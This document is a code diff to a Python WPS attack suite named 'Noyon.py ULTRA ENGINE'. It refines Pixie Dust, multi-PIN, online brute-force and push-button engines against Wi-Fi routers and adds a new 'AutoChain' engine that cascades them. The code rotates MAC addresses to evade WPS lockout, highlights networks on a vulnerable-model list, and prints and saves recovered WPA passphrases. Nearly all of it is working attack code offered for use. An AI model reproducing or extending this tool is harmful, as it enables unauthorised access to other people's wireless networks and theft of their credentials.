+    def run(self, bssid, **kwargs):
         pins = self.generator.getSuggested(bssid)
         vendor = WPSpin.get_vendor(bssid)
-
         UI.section(f'Engine: {self.name}')
         UI.info(f'Target: {bssid}')
         UI.info(f'Vendor: {UI.BOLD}{vendor}{UI.RESET}')
         UI.info(f'Candidates: {len(pins)}')
         UI.divider()
 
-        single_engine = SinglePinEngine(self.c, '')
-
+        single = SinglePinEngine(self.c, '')
         for i, entry in enumerate(pins, 1):
             UI.plain()
             UI.warn(f'[{i}/{len(pins)}] {entry["name"]} → {entry["pin"]}')
 
-            # Check lock state before trying
             if self.c.lock_guard.is_locked():
                 if not self.c.lock_guard.rotate_mac():
-                    UI.err('Attack halted: WPS locked, cannot rotate')
+                    UI.err('Cannot proceed — locked')
                     return False
 
-            single_engine.pin = entry['pin']
-            if single_engine._wps_attempt(bssid, entry['pin']):
+            single.pin = entry['pin']
+            if single._wps_attempt(bssid, entry['pin']):
                 return True
 
-        UI.err('All suggested PINs failed')
+            # If WPS disabled on router, don't waste time
+            if self.c.connection_status.wps_disabled:
+                UI.err('WPS disabled on router — Multi-PIN cannot proceed')
+                return False
+
+        UI.err('All PINs failed')
         return False
 
 
@@ -1106,19 +1060,18 @@ class MultiPinEngine(AttackEngine):
 # ═══════════════════════════════════════════════════════════════════
 class PixieDustEngine(AttackEngine):
     name = 'Pixie Dust'
-    description = 'Offline PIN recovery from WPS handshake'
+    description = 'Offline PIN recovery'
 
     def __init__(self, companion, showcmd=False, force=False):
         super().__init__(companion)
         self.showcmd = showcmd
         self.force = force
 
-    def run(self, bssid: str, **kwargs) -> bool:
+    def run(self, bssid, **kwargs):
         UI.section(f'Engine: {self.name}')
         UI.info(f'Target: {bssid}')
         UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')
 
-        # Step 1: Try cached PIN
         try:
             fn = self.c.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
             with open(fn, 'r') as f:
@@ -1131,31 +1084,30 @@ class PixieDustEngine(AttackEngine):
         except FileNotFoundError:
             pass
 
-        # Step 2: Trigger WPS handshake with dummy PIN
-        dummy_pin = self.generator.getLikely(bssid) or '12345670'
-        UI.warn(f'Starting handshake with PIN {dummy_pin}…')
+        dummy = self.generator.getLikely(bssid) or '12345670'
+        UI.warn(f'Starting handshake with {dummy}…')
 
-        if not self._do_handshake(bssid, dummy_pin):
+        if not self._do_handshake(bssid, dummy):
             UI.err('Handshake failed')
             return False
 
-        # Step 3: Run pixiewps
+        if self.c.connection_status.wps_disabled:
+            UI.err('WPS is disabled on this router — Pixie Dust impossible')
+            return False
+
         if not self.c.pixie_creds.got_all():
-            UI.err('Not enough data for Pixie Dust')
+            UI.err('Not enough data (router may have WPS off)')
             return False
 
         pin = self.c.run_pixiewps(self.showcmd, self.force)
         if not pin:
-            UI.err('Pixie Dust failed to recover PIN')
+            UI.err('Pixie Dust failed (firmware likely patched)')
             return False
 
-        UI.ok(f'Pixie Dust recovered PIN: {UI.BOLD}{pin}{UI.RESET}')
-
-        # Step 4: Try recovered PIN
+        UI.ok(f'Recovered PIN: {UI.BOLD}{pin}{UI.RESET}')
         return self._try_pin(bssid, pin, store_on_fail=True)
 
-    def _do_handshake(self, bssid, pin) -> bool:
-        """Trigger WPS_REG to collect Pixie Dust data."""
+    def _do_handshake(self, bssid, pin):
         c = self.c
         c.pixie_creds.clear()
         c.connection_status.clear()
@@ -1168,8 +1120,7 @@ class PixieDustEngine(AttackEngine):
         except Exception:
             pass
 
-        cmd = f'WPS_REG {bssid} {pin}'
-        r = c.sendAndReceive(cmd)
+        r = c.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
             UI.err(f'Handshake rejected: {r.strip()}')
             self._handle_lock()
@@ -1191,6 +1142,8 @@ class PixieDustEngine(AttackEngine):
                 break
             if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                 break
+            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
+                break
             if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                 UI.err('Handshake timeout')
                 c.connection_status.status = 'WPS_FAIL'
@@ -1202,25 +1155,19 @@ class PixieDustEngine(AttackEngine):
             return True
         elif c.connection_status.status == 'WPS_FAIL':
             self._handle_lock()
-        return True  # We still may have captured handshake data
+        return True
 
-    def _try_pin(self, bssid, pin, store_on_fail=False) -> bool:
-        """Try PIN with PSK retry mechanism."""
+    def _try_pin(self, bssid, pin, store_on_fail=False):
         for attempt in range(1, Config.PSK_RETRY_COUNT + 1):
             UI.plain()
-            UI.warn(f'PSK retry attempt {attempt}/{Config.PSK_RETRY_COUNT}')
-
+            UI.warn(f'PSK retry {attempt}/{Config.PSK_RETRY_COUNT}')
             single = SinglePinEngine(self.c, pin)
             if single._wps_attempt(bssid, pin):
                 return True
-
-            # PIN valid but PSK failed (M5 ok, M6/M7 fail) → retry with delay
             if self.c.connection_status.isFirstHalfValid():
-                UI.warn('PIN accepted, but PSK stage failed')
+                UI.warn('PIN accepted, PSK failed')
                 if attempt < Config.PSK_RETRY_COUNT:
-                    UI.info(f'Waiting {Config.PSK_RETRY_DELAY}s before retry…')
                     time.sleep(Config.PSK_RETRY_DELAY)
-
         if store_on_fail:
             self.c.save_pin(bssid, pin)
         return False
@@ -1231,7 +1178,7 @@ class PixieDustEngine(AttackEngine):
 # ═══════════════════════════════════════════════════════════════════
 class BruteForceEngine(AttackEngine):
     name = 'Brute Force'
-    description = 'Online PIN bruteforce (first half + second half)'
+    description = 'Online PIN bruteforce'
 
     def __init__(self, companion, start_pin=None, delay=None):
         super().__init__(companion)
@@ -1239,12 +1186,11 @@ class BruteForceEngine(AttackEngine):
         self.delay = delay
         self.bf_status = BruteforceStatus()
 
-    def run(self, bssid: str, **kwargs) -> bool:
+    def run(self, bssid, **kwargs):
         UI.section(f'Engine: {self.name}')
         UI.info(f'Target: {bssid}')
         UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')
 
-        # Determine mask
         if (not self.start_pin) or (len(self.start_pin) < 4):
             try:
                 fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
@@ -1270,37 +1216,34 @@ class BruteForceEngine(AttackEngine):
             return self.result
         except KeyboardInterrupt:
             UI.plain()
-            UI.warn('Aborting bruteforce…')
+            UI.warn('Aborting…')
             fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
             with open(fn, 'w') as f:
                 f.write(self.bf_status.mask)
-            UI.info(f'Session saved in {fn}')
+            UI.info(f'Session saved')
             raise
 
     def _first_half(self, bssid, start):
-        checksum = self.generator.checksum
+        ck = self.generator.checksum
         f_half = start
         while int(f_half) < 10000:
             t = int(f_half + '000')
-            pin = f'{f_half}000{checksum(t)}'
-
-            # Lock check
+            pin = f'{f_half}000{ck(t)}'
             if self.c.lock_guard.is_locked():
                 if not self.c.lock_guard.rotate_mac():
                     return False
-
             engine = SinglePinEngine(self.c, pin)
             if engine._wps_attempt(bssid, pin):
                 self.result = True
-                return False  # PSK found, no need to continue
+                return False
+            if self.c.connection_status.wps_disabled:
+                UI.err('WPS disabled — stopping bruteforce')
+                return False
             if self.c.connection_status.isFirstHalfValid():
                 UI.ok('First half found')
                 return f_half
-
             if self.c.connection_status.status == 'WPS_FAIL':
-                UI.warn('Transaction failed, retrying after pause')
                 time.sleep(Config.BRUTEFORCE_FAIL_PAUSE)
-
             f_half = str(int(f_half) + 1).zfill(4)
             self.bf_status.registerAttempt(f_half)
             if self.delay:
@@ -1309,22 +1252,19 @@ class BruteForceEngine(AttackEngine):
         return False
 
     def _second_half(self, bssid, f_half, s_half):
-        checksum = self.generator.checksum
+        ck = self.generator.checksum
         while int(s_half) < 1000:
             t = int(f_half + s_half)
-            pin = f'{f_half}{s_half}{checksum(t)}'
-
+            pin = f'{f_half}{s_half}{ck(t)}'
             if self.c.lock_guard.is_locked():
                 if not self.c.lock_guard.rotate_mac():
                     return False
-
             engine = SinglePinEngine(self.c, pin)
             if engine._wps_attempt(bssid, pin):
                 self.result = True
                 return pin
             if self.c.connection_status.last_m_message > 6:
                 return pin
-
             s_half = str(int(s_half) + 1).zfill(3)
             self.bf_status.registerAttempt(f_half + s_half)
             if self.delay:
@@ -1333,26 +1273,23 @@ class BruteForceEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: PBC (Push Button)
+#  ENGINE: PBC
 # ═══════════════════════════════════════════════════════════════════
 class PBCEngine(AttackEngine):
     name = 'PBC'
-    description = 'WPS Push Button Connection'
+    description = 'WPS Push Button'
 
-    def run(self, bssid: str = None, **kwargs) -> bool:
+    def run(self, bssid=None, **kwargs):
         UI.section(f'Engine: {self.name}')
         c = self.c
-
         if bssid:
             UI.warn(f'PBC to {bssid}…')
             cmd = f'WPS_PBC {bssid}'
         else:
-            UI.warn('PBC (any AP)…')
+            UI.warn('PBC (any)…')
             cmd = 'WPS_PBC'
-
         c.pixie_creds.clear()
         c.connection_status.clear()
-
         try:
             os.set_blocking(c.wpas.stdout.fileno(), False)
             while c.wpas.stdout.read(1024):
@@ -1360,12 +1297,10 @@ class PBCEngine(AttackEngine):
             os.set_blocking(c.wpas.stdout.fileno(), True)
         except Exception:
             pass
-
         r = c.sendAndReceive(cmd)
         if 'OK' not in r:
             UI.err(f'PBC rejected: {r.strip()}')
             return False
-
         start = time.time()
         while True:
             try:
@@ -1383,32 +1318,90 @@ class PBCEngine(AttackEngine):
             if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                 UI.err('PBC timeout')
                 break
-
         c.sendOnly('WPS_CANCEL')
-
         if c.connection_status.status == 'GOT_PSK':
             target = c.connection_status.bssid or bssid or 'Unknown'
-            c.print_credentials('<PBC>', c.connection_status.wpa_psk,
-                                c.connection_status.essid)
+            c.print_credentials('<PBC>', c.connection_status.wpa_psk, c.connection_status.essid)
             if c.save_result:
-                c.save_result(target, c.connection_status.essid,
-                              '<PBC>', c.connection_status.wpa_psk)
+                c.save_result(target, c.connection_status.essid, '<PBC>', c.connection_status.wpa_psk)
             return True
         return False
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE REGISTRY — External Engine Loader
+#  ENGINE: AutoChain — NEW! Cascade: Pixie → Multi-PIN → Bruteforce
+# ═══════════════════════════════════════════════════════════════════
+class AutoChainEngine(AttackEngine):
+    name = 'Auto Chain'
+    description = 'Cascade Pixie → Multi-PIN → Bruteforce'
+
+    def __init__(self, companion, showcmd=False, force=False, allow_bruteforce=True):
+        super().__init__(companion)
+        self.showcmd = showcmd
+        self.force = force
+        self.allow_bruteforce = allow_bruteforce
+
+    def run(self, bssid, **kwargs):
+        UI.section(f'Engine: {self.name}')
+        UI.info(f'Target: {bssid}')
+        UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')
+        UI.info(f'Chain: Pixie → Multi-PIN' +
+                (' → Bruteforce' if self.allow_bruteforce else ''))
+
+        # ── Stage 1: Pixie Dust ───────────────────────────────────
+        UI.stage('Stage 1/3: Pixie Dust')
+        pixie = PixieDustEngine(self.c, self.showcmd, self.force)
+        try:
+            if pixie.run(bssid):
+                return True
+        except Exception as e:
+            UI.err(f'Pixie exception: {e}')
+
+        if self.c.connection_status.wps_disabled:
+            UI.err('Router has WPS disabled — aborting chain')
+            return False
+
+        # ── Stage 2: Multi-PIN ────────────────────────────────────
+        UI.stage('Stage 2/3: Multi-PIN')
+        multi = MultiPinEngine(self.c)
+        try:
+            if multi.run(bssid):
+                return True
+        except Exception as e:
+            UI.err(f'Multi-PIN exception: {e}')
+
+        if self.c.connection_status.wps_disabled:
+            UI.err('Router has WPS disabled — aborting chain')
+            return False
+
+        # ── Stage 3: Bruteforce (optional) ────────────────────────
+        if self.allow_bruteforce:
+            UI.stage('Stage 3/3: Bruteforce')
+            try:
+                ans = input(f'{UI.CYAN}[?] Start bruteforce? '
+                            f'(slow, 2-10 hours) [n/Y]: {UI.RESET}')
+                if ans.lower() != 'n':
+                    br = BruteForceEngine(self.c)
+                    if br.run(bssid):
+                        return True
+            except KeyboardInterrupt:
+                UI.warn('Bruteforce skipped')
+
+        UI.err('AutoChain exhausted all stages')
+        return False
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  ENGINE REGISTRY
 # ═══════════════════════════════════════════════════════════════════
 class EngineRegistry:
-    """Central registry of all available engines."""
-
     ENGINES = {
         'single':      SinglePinEngine,
         'multi-pin':   MultiPinEngine,
         'pixie':       PixieDustEngine,
         'bruteforce':  BruteForceEngine,
         'pbc':         PBCEngine,
+        'auto':        AutoChainEngine,
     }
 
     @classmethod
@@ -1423,18 +1416,16 @@ class EngineRegistry:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WIFI SCANNER
+#  WIFI SCANNER — FIXED
 # ═══════════════════════════════════════════════════════════════════
 class WiFiScanner:
     def __init__(self, interface, vuln_list=None, reverse_scan=False):
         self.interface = interface
         self.vuln_list = vuln_list or []
         self.reverse_scan = reverse_scan
-
         reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
         try:
-            with open(reports_fname, 'r', newline='', encoding='utf-8',
-                      errors='replace') as f:
+            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as f:
                 csvReader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                 next(csvReader)
                 self.stored = [(row[1], row[2]) for row in csvReader]
@@ -1447,43 +1438,31 @@ class WiFiScanner:
                              'WPS locked': False, 'Model': '',
                              'Model number': '', 'Device name': '',
                              'BSSID': result.group(1).upper()})
-
         def h_essid(line, result, networks):
             networks[-1]['ESSID'] = self._decode(result.group(1))
-
         def h_level(line, result, networks):
             networks[-1]['Level'] = int(float(result.group(1)))
-
         def h_sec(line, result, networks):
             sec = networks[-1]['Security type']
             if result.group(1) == 'capability':
                 sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
             elif sec == 'WEP':
-                if result.group(1) == 'RSN':
-                    sec = 'WPA2'
-                elif result.group(1) == 'WPA':
-                    sec = 'WPA'
+                if result.group(1) == 'RSN': sec = 'WPA2'
+                elif result.group(1) == 'WPA': sec = 'WPA'
             elif sec == 'WPA':
-                if result.group(1) == 'RSN':
-                    sec = 'WPA/WPA2'
+                if result.group(1) == 'RSN': sec = 'WPA/WPA2'
             elif sec == 'WPA2':
-                if result.group(1) == 'WPA':
-                    sec = 'WPA/WPA2'
+                if result.group(1) == 'WPA': sec = 'WPA/WPA2'
             networks[-1]['Security type'] = sec
-
         def h_wps(line, result, networks):
             networks[-1]['WPS'] = result.group(1)
-
         def h_wpslock(line, result, networks):
             if int(result.group(1), 16):
                 networks[-1]['WPS locked'] = True
-
         def h_model(line, result, networks):
             networks[-1]['Model'] = self._decode(result.group(1))
-
         def h_modelno(line, result, networks):
             networks[-1]['Model number'] = self._decode(result.group(1))
-
         def h_device(line, result, networks):
             networks[-1]['Device name'] = self._decode(result.group(1))
 
@@ -1513,7 +1492,6 @@ class WiFiScanner:
             re.compile(r' [*] Model Number: (.*)'): h_modelno,
             re.compile(r' [*] Device name: (.*)'): h_device,
         }
-
         for line in proc.stdout.splitlines():
             if line.startswith('command failed:'):
                 UI.err(f'Scan error: {line}')
@@ -1536,39 +1514,40 @@ class WiFiScanner:
             return f'{codes.get(c, "")}{text}{UI.RESET}'
 
         UI.section('WPS Networks Detected')
-
         if self.vuln_list:
-            print(f'{color("●", "green")} Possibly vulnerable  '
-                  f'{color("●", "red")} WPS locked  '
-                  f'{color("●", "yellow")} Already stored')
+            print(f'{color("●", "green")} Vulnerable  '
+                  f'{color("●", "red")} Locked  '
+                  f'{color("●", "yellow")} Stored')
             print()
 
-        print(f'  {UI.GRAY}{"#":<5}{"BSSID":<20}{"ESSID":<24}'
-              f'{"Sec.":<9}{"PWR":<6}{"Vendor":<18}{"WSC Model"}{UI.RESET}')
-        print(f'  {UI.GRAY}{"─" * 110}{UI.RESET}')
+        # Compact for Termux
+        print(f'  {UI.GRAY}{"#":<3}{"BSSID":<18}{"ESSID":<16}'
+              f'{"Sec":<8}{"PWR":<5}{"Vendor":<12}Model{UI.RESET}')
+        print(f'  {UI.GRAY}{"─" * 62}{UI.RESET}')
 
         items = list(network_list.items())
         if self.reverse_scan:
             items = items[::-1]
         for n, network in items:
-            model = '{} {}'.format(network['Model'],
-                                   network['Model number']).strip() or '—'
-            essid = truncate(network.get('ESSID', 'HIDDEN'), 22)
-            vendor = truncate(WPSpin.get_vendor(network['BSSID']), 16)
-            line = (f'  {n:<5}{network["BSSID"]:<20}{essid} '
-                    f'{network["Security type"]:<8} '
-                    f'{network["Level"]:<5} {vendor} {model}')
+            model = '{} {}'.format(network['Model'], network['Model number']).strip() or '-'
+            essid = truncate(network.get('ESSID', 'HIDDEN'), 14)
+            vendor = truncate(WPSpin.get_vendor(network['BSSID']), 11)
+            model_s = truncate(model, 18)
+            line = (f'  {n:<3}{network["BSSID"]:<18}{essid} '
+                    f'{network["Security type"]:<7} '
+                    f'{str(network["Level"]):<4} {vendor} {model_s}')
             if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                 print(color(line, 'yellow'))
             elif network['WPS locked']:
                 print(color(line, 'red'))
-            elif self.vuln_list and (model in self.vuln_list):
+            elif self.vuln_list and any(v.strip() and v.strip() in model
+                                        for v in self.vuln_list):
                 print(color(line, 'green'))
             else:
                 print(line)
 
         UI.divider()
-        UI.info(f'Total: {len(networks)} WPS-enabled networks')
+        UI.info(f'Total: {len(networks)} WPS networks')
         return network_list
 
     @staticmethod
@@ -1576,15 +1555,14 @@ class WiFiScanner:
         return (codecs.decode(d, 'unicode-escape')
                 .encode('latin1').decode('utf-8', errors='replace'))
 
-    def prompt_network(self) -> str:
+    def prompt_network(self):
         networks = self.iw_scanner()
         if not networks:
             UI.err('No WPS networks found.')
             return ''
         while True:
             try:
-                no = input(f'{UI.CYAN}Select target '
-                           f'(Enter = refresh): {UI.RESET}').strip()
+                no = input(f'{UI.CYAN}Select target (Enter = refresh): {UI.RESET}').strip()
                 if no.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 if int(no) in networks.keys():
@@ -1594,9 +1572,6 @@ class WiFiScanner:
                 UI.err('Invalid number')
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  UTILITIES
-# ═══════════════════════════════════════════════════════════════════
 def ifaceUp(iface, down=False):
     action = 'down' if down else 'up'
     res = subprocess.run(f'ip link set {iface} {action}', shell=True,
@@ -1618,69 +1593,39 @@ def show_banner():
             pass
     print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
     print(f'  {UI.BOLD}{UI.WHITE}Noyon.py{UI.RESET}  ·  {UI.CYAN}ULTRA ENGINE Edition{UI.RESET}')
-    print(f'  {UI.GRAY}Author:{UI.RESET} Noyon  ·  {UI.GRAY}Owner:{UI.RESET} @mohammad_noyon')
-    print(f'  {UI.GRAY}Architecture:{UI.RESET} External Engines | Lock Guard | MAC Rotation')
+    print(f'  {UI.GRAY}Author:{UI.RESET} Noyon  ·  {UI.GRAY}Owner:{UI.RESET} @NOYONRRP  ·  {UI.GRAY}Channel:{UI.RESET} @SGCODEX')
+    print(f'  {UI.GRAY}Architecture:{UI.RESET} External Engines | AutoChain | Lock Guard | MAC Rotation')
     print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
     print()
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  MAIN — Engine Orchestrator
-# ═══════════════════════════════════════════════════════════════════
 if __name__ == '__main__':
     import argparse
-    parser = argparse.ArgumentParser(
-        description='Noyon.py ULTRA ENGINE — WPS Attack Suite')
-    parser.add_argument('-i', '--interface', type=str, required=True,
-                        help='Wireless interface')
-    parser.add_argument('-b', '--bssid', type=str, help='Target BSSID')
-    parser.add_argument('-p', '--pin', type=str, help='Use specific PIN')
-
-    # Engine selection
-    parser.add_argument('-K', '--pixie-dust', action='store_true',
-                        help='[Engine] Pixie Dust attack')
-    parser.add_argument('-B', '--bruteforce', action='store_true',
-                        help='[Engine] Online bruteforce')
-    parser.add_argument('-M', '--multi-pin', action='store_true',
-                        help='[Engine] Try all suggested PINs')
-    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
-                        help='[Engine] WPS Push Button Connection')
-
-    # Engine options
-    parser.add_argument('-F', '--pixie-force', action='store_true',
-                        help='Pixiewps --force mode')
-    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
-                        help='Print pixiewps command')
-    parser.add_argument('-d', '--delay', type=float,
-                        help='Delay between PIN attempts (bruteforce)')
-
-    # Config
-    parser.add_argument('-w', '--write', action='store_true',
-                        help='Save credentials to file')
-    parser.add_argument('--no-mac-rotate', action='store_true',
-                        help='Disable MAC rotation on WPS lock')
-    parser.add_argument('--lock-threshold', type=int, default=3,
-                        help='WPS-FAIL count before MAC rotation (default: 3)')
-    parser.add_argument('--lock-cooldown', type=int, default=30,
-                        help='Seconds to wait after WPS lock (default: 30)')
-
-    # Misc
-    parser.add_argument('-l', '--loop', action='store_true',
-                        help='Loop mode')
-    parser.add_argument('-r', '--reverse-scan', action='store_true',
-                        help='Reverse scan order')
-    parser.add_argument('--iface-down', action='store_true',
-                        help='Bring iface down at exit')
-    parser.add_argument('--mtk-wifi', action='store_true',
-                        help='Enable MediaTek Wi-Fi')
-    parser.add_argument('-v', '--verbose', action='store_true',
-                        help='Verbose output')
-    parser.add_argument('--list-engines', action='store_true',
-                        help='List available engines')
+    parser = argparse.ArgumentParser(description='Noyon.py ULTRA ENGINE — WPS Attack Suite')
+    parser.add_argument('-i', '--interface', type=str, required=True)
+    parser.add_argument('-b', '--bssid', type=str)
+    parser.add_argument('-p', '--pin', type=str)
+    parser.add_argument('-K', '--pixie-dust', action='store_true')
+    parser.add_argument('-B', '--bruteforce', action='store_true')
+    parser.add_argument('-M', '--multi-pin', action='store_true')
+    parser.add_argument('--auto', action='store_true',
+                        help='[Engine] AutoChain: Pixie → Multi-PIN → Bruteforce')
+    parser.add_argument('--pbc', '--push-button-connect', action='store_true')
+    parser.add_argument('-F', '--pixie-force', action='store_true')
+    parser.add_argument('-X', '--show-pixie-cmd', action='store_true')
+    parser.add_argument('-d', '--delay', type=float)
+    parser.add_argument('-w', '--write', action='store_true')
+    parser.add_argument('--no-mac-rotate', action='store_true')
+    parser.add_argument('--lock-threshold', type=int, default=3)
+    parser.add_argument('--lock-cooldown', type=int, default=30)
+    parser.add_argument('-l', '--loop', action='store_true')
+    parser.add_argument('-r', '--reverse-scan', action='store_true')
+    parser.add_argument('--iface-down', action='store_true')
+    parser.add_argument('--mtk-wifi', action='store_true')
+    parser.add_argument('-v', '--verbose', action='store_true')
+    parser.add_argument('--list-engines', action='store_true')
     parser.add_argument('--vuln-list', type=str,
-                        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
-                        help='Vulnerable devices list')
-
+                        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt')
     args = parser.parse_args()
 
     if args.list_engines:
@@ -1692,7 +1637,6 @@ if __name__ == '__main__':
     if os.getuid() != 0:
         die('Run as root')
 
-    # Apply runtime config
     Config.MAC_ROTATION_ENABLED = not args.no_mac_rotate
     Config.WPS_FAIL_THRESHOLD = args.lock_threshold
     Config.LOCK_COOLDOWN = args.lock_cooldown
@@ -1700,7 +1644,7 @@ if __name__ == '__main__':
     if args.mtk_wifi:
         wmt = Path('/dev/wmtWifi')
         if not wmt.is_char_device():
-            die('MediaTek Wi-Fi device not found')
+            die('MediaTek Wi-Fi not found')
         wmt.chmod(0o644)
         wmt.write_text('1')
 
@@ -1718,7 +1662,6 @@ if __name__ == '__main__':
                                       print_debug=args.verbose,
                                       bssid=args.bssid or '')
 
-                # Determine BSSID
                 if not args.pbc and not args.bssid:
                     try:
                         with open(args.vuln_list, 'r', encoding='utf-8') as f:
@@ -1729,27 +1672,26 @@ if __name__ == '__main__':
                                           reverse_scan=args.reverse_scan)
                     args.bssid = scanner.prompt_network()
 
-                # Select & run engine
                 engine = None
                 if args.pbc:
                     engine = PBCEngine(companion)
                 elif args.bruteforce:
                     engine = BruteForceEngine(companion, args.pin, args.delay)
+                elif args.auto:
+                    engine = AutoChainEngine(companion, args.show_pixie_cmd,
+                                             args.pixie_force, True)
                 elif args.multi_pin:
                     engine = MultiPinEngine(companion)
                 elif args.pixie_dust:
-                    engine = PixieDustEngine(companion, args.show_pixie_cmd,
-                                             args.pixie_force)
+                    engine = PixieDustEngine(companion, args.show_pixie_cmd, args.pixie_force)
                 elif args.bssid and args.pin:
                     engine = SinglePinEngine(companion, args.pin)
                 elif args.bssid:
-                    # Default: multi-pin
                     engine = MultiPinEngine(companion)
                 else:
                     UI.err('No target specified')
                     break
 
-                # Execute
                 if args.pbc:
                     success = engine.run()
                 else:
@@ -1762,6 +1704,11 @@ if __name__ == '__main__':
                     UI.ok('Attack succeeded!')
                 else:
                     UI.err('Attack failed')
+                    # Show why
+                    if companion.connection_status.wps_disabled:
+                        UI.warn('Reason: WPS is disabled on router firmware')
+                    elif companion.connection_status.wps_unreachable:
+                        UI.warn('Reason: Router not responding to WPS')
 
                 if not args.loop:
                     break
